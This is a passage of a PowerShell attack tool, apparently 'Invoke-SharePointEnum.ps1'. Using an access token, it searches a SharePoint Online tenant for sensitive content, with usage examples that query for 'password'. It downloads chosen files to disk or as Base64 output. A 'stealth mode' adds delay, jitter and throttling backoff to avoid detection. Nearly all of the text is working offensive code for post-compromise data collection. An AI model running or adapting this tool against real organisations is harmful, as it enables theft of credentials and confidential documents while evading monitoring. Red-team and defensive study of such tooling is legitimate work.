                    if (-not $script:StealthConfig.QuietMode) {
                        Write-Host "    [!] Service unavailable. Backing off for $backoffSeconds seconds..." -ForegroundColor Yellow
                    }
                    Start-Sleep -Seconds $backoffSeconds
                    $retryCount++
                    continue
                }
            }

            # For other errors, return failure
            return @{
                Success    = $false
                StatusCode = $statusCode
                Error      = $_.Exception.Message
            }
        }
    }

    return @{
        Success    = $false
        StatusCode = $null
        Error      = "Max retries exceeded"
    }
}

# ============================================================================
# SEARCH FUNCTIONS
# ============================================================================

function ConvertTo-SearchResultObject {
    param(
        [Parameter(Mandatory = $true)]
        [object]$Row
    )

    $result = [ordered]@{
        Title            = $null
        Path             = $null
        Author           = $null
        Size             = $null
        SizeFormatted    = $null
        FileType         = $null
        FileExtension    = $null
        Created          = $null
        LastModifiedTime = $null
        Summary          = $null
        SiteName         = $null
        ServerRelativeUrl = $null
    }

    foreach ($cell in $Row.Cells) {
        switch ($cell.Key) {
            "Title"            { $result.Title = $cell.Value }
            "Path"             { $result.Path = $cell.Value }
            "Author"           { $result.Author = $cell.Value }
            "Size"             {
                $result.Size = $cell.Value
                if ($cell.Value -and [long]::TryParse($cell.Value, [ref]$null)) {
                    $result.SizeFormatted = Format-FileSize -Bytes ([long]$cell.Value)
                }
            }
            "FileType"         { $result.FileType = $cell.Value }
            "FileExtension"    { $result.FileExtension = $cell.Value }
            "Created"          { $result.Created = $cell.Value }
            "LastModifiedTime" { $result.LastModifiedTime = $cell.Value }
            "HitHighlightedSummary" { $result.Summary = $cell.Value -replace '<[^>]+>', '' }
            "SiteName"         { $result.SiteName = $cell.Value }
            "SPWebUrl"         {
                if ($cell.Value -and $result.Path) {
                    try {
                        $pathUri = [System.Uri]::new($result.Path)
                        $result.ServerRelativeUrl = $pathUri.AbsolutePath
                    }
                    catch { }
                }
            }
        }
    }

    return [PSCustomObject]$result
}

function Invoke-SharePointSearch {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SearchQuery,

        [Parameter(Mandatory = $false)]
        [int]$RowLimit = 50,

        [Parameter(Mandatory = $false)]
        [int]$Start = 0,

        [Parameter(Mandatory = $false)]
        [bool]$FQL = $false,

        [Parameter(Mandatory = $false)]
        [string]$Refinement = ""
    )

    Write-Host "`n[*] Executing SharePoint search..." -ForegroundColor Cyan
    Write-Host "[*] Query: $SearchQuery" -ForegroundColor Cyan
    Write-Host "[*] Max rows: $RowLimit | Start row: $Start" -ForegroundColor Cyan
    if ($FQL) {
        Write-Host "[*] FQL mode: Enabled" -ForegroundColor Cyan
    }
    if ($Refinement) {
        Write-Host "[*] Refinement filter: $Refinement" -ForegroundColor Cyan
    }

    $searchUrl = "$($script:SPOBaseUrl)/_api/search/postquery"

    $selectProperties = @(
        "Title", "Path", "Author", "Size", "FileType", "FileExtension",
        "Created", "LastModifiedTime", "HitHighlightedSummary", "SiteName",
        "SPWebUrl", "ContentType", "IsDocument"
    )

    $requestBody = @{
        request = @{
            Querytext        = $SearchQuery
            RowLimit         = $RowLimit
            StartRow         = $Start
            EnableFQL        = $FQL
            SelectProperties = @{
                results = $selectProperties
            }
        }
    }

    if ($Refinement) {
        $requestBody.request.RefinementFilters = @{
            results = @($Refinement)
        }
    }

    $response = Invoke-SPRequest -Uri $searchUrl -Method "POST" -Body $requestBody -Context "search query"

    if (-not $response.Success) {
        Write-Host "[ERROR] Search request failed: $($response.Error)" -ForegroundColor Red
        return $null
    }

    $content = $response.Content

    # Navigate the odata=verbose response structure
    $queryResult = $null
    if ($content.d -and $content.d.postquery) {
        $queryResult = $content.d.postquery
    }
    elseif ($content.d -and $content.d.query) {
        $queryResult = $content.d.query
    }
    elseif ($content.PrimaryQueryResult) {
        $queryResult = $content
    }

    if (-not $queryResult) {
        Write-Host "[!] Unexpected response structure" -ForegroundColor Yellow
        return $null
    }

    $relevantResults = $null
    if ($queryResult.PrimaryQueryResult -and $queryResult.PrimaryQueryResult.RelevantResults) {
        $relevantResults = $queryResult.PrimaryQueryResult.RelevantResults
    }

    if (-not $relevantResults) {
        Write-Host "[!] No relevant results container found in response" -ForegroundColor Yellow
        return $null
    }

    $totalRows = 0
    if ($relevantResults.TotalRows) {
        $totalRows = [int]$relevantResults.TotalRows
    }

    $rows = @()
    if ($relevantResults.Table -and $relevantResults.Table.Rows) {
        if ($relevantResults.Table.Rows.results) {
            $rows = $relevantResults.Table.Rows.results
        }
        else {
            $rows = $relevantResults.Table.Rows
        }
    }

    Write-Host "[+] Total results available: $totalRows" -ForegroundColor Green
    Write-Host "[+] Results returned: $($rows.Count)" -ForegroundColor Green

    # Store metadata
    $script:Results.SearchMetadata = @{
        TotalRows       = $totalRows
        RowsReturned    = $rows.Count
        StartRow        = $Start
        QueryText       = $SearchQuery
        FQLEnabled      = $FQL
        RefinementFilter = $Refinement
    }

    $script:Results.Summary.TotalResults = $totalRows
    $script:Results.Summary.ResultsReturned = $rows.Count
    $script:Results.Summary.StartRow = $Start

    # Convert rows to result objects
    $searchResults = @()
    foreach ($row in $rows) {
        $cells = $null
        if ($row.Cells -and $row.Cells.results) {
            $cells = $row.Cells.results
        }
        elseif ($row.Cells) {
            $cells = $row.Cells
        }

        if ($cells) {
            $resultObj = ConvertTo-SearchResultObject -Row @{ Cells = $cells }
            $searchResults += $resultObj
        }
    }

    $script:Results.SearchResults = $searchResults
    return $searchResults
}

# ============================================================================
# DOWNLOAD FUNCTIONS
# ============================================================================

function Get-SharePointFile {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ServerRelativeUrl,

        [Parameter(Mandatory = $false)]
        [string]$DestinationPath,

        [Parameter(Mandatory = $false)]
        [switch]$AsBase64
    )

    Write-Host "`n[*] Downloading file from SharePoint..." -ForegroundColor Cyan
    Write-Host "[*] File URL: $ServerRelativeUrl" -ForegroundColor Cyan

    # URL-encode the file path (handle spaces and special characters)
    $encodedUrl = [System.Uri]::EscapeDataString($ServerRelativeUrl)
    $downloadUrl = "$($script:SPOBaseUrl)/_api/web/GetFileByServerRelativeUrl('$encodedUrl')/`$value"

    if ($DestinationPath) {
        # Download to disk
        Write-Host "[*] Saving to: $DestinationPath" -ForegroundColor Cyan

        # Ensure target directory exists
        $targetDir = [System.IO.Path]::GetDirectoryName($DestinationPath)
        if ($targetDir -and -not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        }

        $response = Invoke-SPRequest -Uri $downloadUrl -Method "GET" -Accept "*/*" -OutFile $DestinationPath -Context "file download"

        if ($response.Success) {
            $fileInfo = Get-Item $DestinationPath
            $sizeFormatted = Format-FileSize -Bytes $fileInfo.Length
            Write-Host "[+] File downloaded successfully: $DestinationPath ($sizeFormatted)" -ForegroundColor Green

            $script:Results.DownloadResult = [PSCustomObject]@{
                FileUrl       = $ServerRelativeUrl
                SavedTo       = $DestinationPath
                Size          = $fileInfo.Length
                SizeFormatted = $sizeFormatted
                Method        = "Disk"
                Success       = $true
            }
            $script:Results.Summary.FileDownloaded = $DestinationPath
            return $true
        }
        else {
            Write-Host "[ERROR] Failed to download file: $($response.Error)" -ForegroundColor Red
            return $false
        }
    }
    elseif ($AsBase64) {
        # Download as raw bytes and convert to Base64
        Write-Host "[*] Downloading as Base64-encoded string..." -ForegroundColor Cyan

        $response = Invoke-SPRequest -Uri $downloadUrl -Method "GET" -Accept "*/*" -RawResponse -Context "file download (base64)"

        if ($response.Success) {
            $bytes = $response.Content
            $base64String = [Convert]::ToBase64String($bytes)
            $sizeFormatted = Format-FileSize -Bytes $bytes.Length

            Write-Host "[+] File downloaded successfully ($sizeFormatted)" -ForegroundColor Green
            Write-Host "[+] Base64 length: $($base64String.Length) characters" -ForegroundColor Green
            Write-Host ""
            Write-Host "--- BEGIN BASE64 ---" -ForegroundColor Yellow
            Write-Host $base64String
            Write-Host "--- END BASE64 ---" -ForegroundColor Yellow

            $script:Results.DownloadResult = [PSCustomObject]@{
                FileUrl       = $ServerRelativeUrl
                Size          = $bytes.Length
                SizeFormatted = $sizeFormatted
                Base64Length  = $base64String.Length
                Base64        = $base64String
                Method        = "Base64"
                Success       = $true
            }
            $script:Results.Summary.FileDownloaded = "$ServerRelativeUrl (Base64)"
            return $true
        }
        else {
            Write-Host "[ERROR] Failed to download file: $($response.Error)" -ForegroundColor Red
            return $false
        }
    }
    else {
        Write-Host "[ERROR] Specify -SavePath for disk download or -Base64 for encoded output" -ForegroundColor Red
        return $false
    }
}

# ============================================================================
# DISPLAY FUNCTIONS
# ============================================================================

function Show-SearchResults {
    param(
        [Parameter(Mandatory = $true)]
        [object[]]$Results
    )

    if ($Results.Count -eq 0) {
        Write-Host "`n[*] No search results to display" -ForegroundColor Yellow
        return
    }

    Write-Host "`n" -NoNewline
    Write-Host "=" * 80 -ForegroundColor Cyan
    Write-Host "SEARCH RESULTS ($($Results.Count) items)" -ForegroundColor Cyan
    Write-Host "=" * 80 -ForegroundColor Cyan

    $index = 1
    foreach ($result in $Results) {
        Write-Host ""
        Write-Host "[$index] $($result.Title)" -ForegroundColor White
        Write-Host "    [+] Path: $($result.Path)" -ForegroundColor Green
        if ($result.Author) {
            Write-Host "    [+] Author: $($result.Author)" -ForegroundColor Green
        }
        if ($result.SizeFormatted) {
            Write-Host "    [+] Size: $($result.SizeFormatted)" -ForegroundColor Green
        }
        if ($result.FileType) {
            Write-Host "    [+] Type: $($result.FileType)" -ForegroundColor Green
        }
        if ($result.Created) {
            Write-Host "    [+] Created: $($result.Created)" -ForegroundColor Green
        }
        if ($result.LastModifiedTime) {
            Write-Host "    [+] Modified: $($result.LastModifiedTime)" -ForegroundColor Green
        }
        if ($result.SiteName) {
            Write-Host "    [+] Site: $($result.SiteName)" -ForegroundColor Green
        }
        if ($result.Summary) {
            $truncatedSummary = if ($result.Summary.Length -gt 200) { $result.Summary.Substring(0, 200) + "..." } else { $result.Summary }
            Write-Host "    [+] Summary: $truncatedSummary" -ForegroundColor DarkGray
        }

        $index++
    }

    Write-Host ""
    Write-Host "=" * 80 -ForegroundColor Cyan
}

function Show-MatrixResults {
    param(
        [Parameter(Mandatory = $true)]
        [object[]]$Results
    )

    if ($Results.Count -eq 0) {
        Write-Host "`n[*] No search results to display" -ForegroundColor Yellow
        return
    }

    Write-Host "`n" -NoNewline
    Write-Host "=" * 120 -ForegroundColor Cyan
    Write-Host "MATRIX VIEW - SHAREPOINT SEARCH RESULTS" -ForegroundColor Cyan
    Write-Host "=" * 120 -ForegroundColor Cyan

    if ($script:Results.SearchMetadata) {
        $meta = $script:Results.SearchMetadata
        Write-Host ""
        Write-Host "[SEARCH METADATA]" -ForegroundColor Yellow
        Write-Host ("-" * 80) -ForegroundColor DarkGray
        Write-Host "  Query: $($meta.QueryText)" -ForegroundColor Gray
        Write-Host "  Total available: $($meta.TotalRows) | Returned: $($meta.RowsReturned) | Start row: $($meta.StartRow)" -ForegroundColor Gray
        if ($meta.FQLEnabled) {
            Write-Host "  FQL: Enabled" -ForegroundColor Gray
        }
        if ($meta.RefinementFilter) {
            Write-Host "  Refinement: $($meta.RefinementFilter)" -ForegroundColor Gray
        }
    }

    Write-Host ""
    Write-Host "[RESULTS]" -ForegroundColor Yellow
    Write-Host ("-" * 120) -ForegroundColor DarkGray

    $tableData = $Results | ForEach-Object {
        $titleTrunc = if ($_.Title -and $_.Title.Length -gt 35) { $_.Title.Substring(0, 32) + "..." } else { $_.Title }
        $authorTrunc = if ($_.Author -and $_.Author.Length -gt 20) { $_.Author.Substring(0, 17) + "..." } else { $_.Author }
        $pathTrunc = if ($_.Path -and $_.Path.Length -gt 50) { "..." + $_.Path.Substring($_.Path.Length - 47) } else { $_.Path }

        [PSCustomObject]@{
            Title    = $titleTrunc
            Type     = $_.FileType
            Size     = $_.SizeFormatted
            Author   = $authorTrunc
            Modified = if ($_.LastModifiedTime) { try { ([DateTime]$_.LastModifiedTime).ToString("yyyy-MM-dd") } catch { $_.LastModifiedTime } } else { "" }
            Path     = $pathTrunc
        }
    }

    $tableData | Format-Table -AutoSize -Wrap | Out-String | Write-Host

    Write-Host "=" * 120 -ForegroundColor Cyan
}

# ============================================================================
# EXPORT FUNCTIONS
# ============================================================================

function Export-Results {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path
    )

    $totalItems = $script:Results.SearchResults.Count
    if ($totalItems -eq 0 -and $null -eq $script:Results.DownloadResult) {
        Write-Host "`n[*] No results to export" -ForegroundColor Yellow
        return
    }

    try {
        $extension = [System.IO.Path]::GetExtension($Path).ToLower()

        # Ensure target directory exists
        $targetDir = [System.IO.Path]::GetDirectoryName($Path)
        if ($targetDir -and -not (Test-Path $targetDir)) {
            New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
        }

        switch ($extension) {
            ".csv" {
                if ($script:Results.SearchResults.Count -gt 0) {
                    $script:Results.SearchResults | Export-Csv -Path $Path -NoTypeInformation -Encoding UTF8
                    Write-Host "`n[+] Search results exported to CSV: $Path" -ForegroundColor Green
                }
                else {
                    Write-Host "`n[*] No search results to export to CSV" -ForegroundColor Yellow
                }
            }
            ".json" {
                $exportData = @{
                    ExportDate     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
                    SPOUrl         = $script:Results.Summary.SPOUrl
                    SearchMetadata = $script:Results.SearchMetadata
                    SearchResults  = $script:Results.SearchResults
                    DownloadResult = $script:Results.DownloadResult
                    Summary        = $script:Results.Summary
                }
                $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $Path -Encoding UTF8
                Write-Host "`n[+] Results exported to JSON: $Path" -ForegroundColor Green
            }
            default {
                # Default to CSV
                $csvPath = [System.IO.Path]::ChangeExtension($Path, ".csv")
                if ($script:Results.SearchResults.Count -gt 0) {
                    $script:Results.SearchResults | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8
                    Write-Host "`n[+] Search results exported to CSV: $csvPath" -ForegroundColor Green
                }
            }
        }
    }
    catch {
        Write-Host "`n[ERROR] Failed to export results: $_" -ForegroundColor Red
    }
}

# ============================================================================
# CLEANUP
# ============================================================================

function Invoke-Cleanup {
    Write-Host "`n[*] Cleaning up..." -ForegroundColor Cyan

    # Clear token from memory
    $script:AccessToken = $null

    # Print request statistics
    Write-Host "[+] Total requests made: $($script:StealthConfig.RequestCount)" -ForegroundColor Green
    if ($script:StealthConfig.ThrottleCount -gt 0) {
        Write-Host "[!] Times throttled: $($script:StealthConfig.ThrottleCount)" -ForegroundColor Yellow
    }

    $script:Results.Summary.RequestCount = $script:StealthConfig.RequestCount
    $script:Results.Summary.ThrottleCount = $script:StealthConfig.ThrottleCount

    Write-Host "[+] Token cleared from memory" -ForegroundColor Green
}

# ============================================================================
# MAIN ORCHESTRATOR
# ============================================================================

function Main {
    try {
        Show-Banner

        # Validate that at least one mode is specified
        if (-not $Query -and -not $FileUrl) {
            Write-Host "[ERROR] You must specify -Query (search mode) and/or -FileUrl (download mode)" -ForegroundColor Red
            Write-Host ""
            Write-Host "Search mode:" -ForegroundColor Cyan
            Write-Host "  .\Invoke-SharePointEnum.ps1 -Query ""password""" -ForegroundColor Gray
            Write-Host "  .\Invoke-SharePointEnum.ps1 -SPOUrl example.sharepoint.com -Token `$token -Query ""password""" -ForegroundColor Gray
            Write-Host ""
            Write-Host "Download mode:" -ForegroundColor Cyan
            Write-Host "  .\Invoke-SharePointEnum.ps1 -FileUrl ""/sites/hr/Shared Documents/report.docx"" -SavePath ""report.docx""" -ForegroundColor Gray
            Write-Host "  .\Invoke-SharePointEnum.ps1 -SPOUrl example.sharepoint.com -Token `$token -FileUrl ""/sites/hr/Shared Documents/report.docx"" -Base64" -ForegroundColor Gray
            exit 1
        }

        # Normalize SPOUrl if explicitly provided (auto-detect sets it in Initialize-Authentication)
        if ($SPOUrl) {
            $script:SPOBaseUrl = "https://$($SPOUrl.TrimStart('https://').TrimStart('http://').TrimEnd('/'))"
            $script:Results.Summary.SPOUrl = $SPOUrl
        }
        $script:Results.Summary.SearchQuery = $Query

        # Show stealth config if active
        if ($script:StealthConfig.Enabled -or $script:StealthConfig.BaseDelay -gt 0) {
            Write-Host "[*] Stealth mode: ACTIVE (delay: $($script:StealthConfig.BaseDelay)s, jitter: $($script:StealthConfig.Jitter)s, retries: $($script:StealthConfig.MaxRetries))" -ForegroundColor Cyan
        }

        # Authenticate (includes auto-detection of SPOUrl if not provided)
        if (-not (Initialize-Authentication)) {
            exit 1
        }

        # Display target after auth (SPOUrl may have been auto-detected)
        Write-Host "[*] Target: $($script:SPOBaseUrl)" -ForegroundColor Cyan

        # === SEARCH MODE ===
        if ($Query) {
            $searchResults = Invoke-SharePointSearch `
                -SearchQuery $Query `
                -RowLimit $MaxRows `
                -Start $StartRow `
                -FQL $EnableFQL.IsPresent `
                -Refinement $RefinementFilter

            if ($searchResults -and $searchResults.Count -gt 0) {
                if ($Matrix) {
                    Show-MatrixResults -Results $searchResults
                }
                else {
                    Show-SearchResults -Results $searchResults
                }
            }
            elseif ($null -ne $searchResults) {
                Write-Host "`n[*] Search completed but returned no results" -ForegroundColor Yellow
            }
        }

        # === DOWNLOAD MODE ===
        if ($FileUrl) {
            Get-SharePointFile -ServerRelativeUrl $FileUrl -DestinationPath $SavePath -AsBase64:$Base64
        }

        # Export if requested
        if ($ExportPath) {
            Export-Results -Path $ExportPath
        }

        Write-Host "`n[*] SharePoint enumeration completed successfully!" -ForegroundColor Green
    }
    catch {
        Write-Host "`n[ERROR] An unexpected error occurred: $_" -ForegroundColor Red
        Write-Host $_.ScriptStackTrace -ForegroundColor Red
    }
    finally {
        Invoke-Cleanup
    }
}

# Run main function
Main
